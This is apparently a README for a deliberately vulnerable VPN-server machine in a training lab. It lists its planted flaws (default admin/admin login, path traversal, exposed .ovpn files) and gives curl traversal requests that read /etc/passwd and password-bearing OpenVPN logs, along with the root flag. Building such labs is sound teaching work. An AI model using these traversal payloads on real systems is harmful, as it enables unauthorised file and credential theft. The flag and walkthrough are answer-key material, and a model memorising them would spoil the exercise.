# 🏢 VulnCorp — Machine 5: rz-vpn01 (VPN Concentrator)

> ⚠️ **FOR EDUCATIONAL / LAB USE ONLY — NEVER EXPOSE TO THE INTERNET**

Machine 5 is the VPN management server in the **Restricted Zone (`172.16.0.20`)** featuring a web admin portal with **Default Credentials (`admin`/`admin`)**, **Path Traversal**, and **Sensitive Client Configurations (`.ovpn`)**.

---

## 🚀 Quick Start (One-Command Deploy)

Run this on **Ubuntu 24.04 LTS** instance `rzvpn01` (`172.16.0.20`).

Spec services: Flask 3.0.x (Python 3.12.3), OpenVPN 2.6.9.

```bash
git clone https://github.com/YOUR_GITHUB_USERNAME/webserver.git
cd webserver/machines/rz-vpn01

chmod +x deploy.sh
sudo ./deploy.sh
```

---

## 📡 Exposed Ports & Services

| Service | Port | Description | Vulnerability |
|---------|------|-------------|---------------|
| **VPN Admin Portal** | `8443` | Flask Application | **Default Credentials** (`admin` / `admin`), **Path Traversal** in file download |
| **SSH** | `22` | OpenSSH | User `vpnadmin` has `sudo` privileges |

---

## 🔍 Attack Vectors & Exploitation Guide

### 1. Web Portal Authentication
Navigate to `http://172.16.0.20:8443/` and login with:
- **Username:** `admin`
- **Password:** `admin`

### 2. Path Traversal File Read
Download internal configuration or system files:
```bash
# Read /etc/passwd
curl "http://172.16.0.20:8443/download/..%2f..%2f..%2fetc%2fpasswd"

# Read leaked openvpn logs (contains user passwords)
curl "http://172.16.0.20:8443/download/..%2f..%2fvar%2flog%2fopenvpn%2fopenvpn.log"
```

### 3. Lateral Movement Clues
Download `it-admin.ovpn` and `backup-agent.ovpn` to obtain credentials and network routes for the **Internal Zone (`192.168.1.0/24`)**.

---

## 🏆 Flags

- **Root Flag:** `/root/root.txt` (`VULN{vpn_s3rv3r_r00t3d_m4ch1n3_5}`)
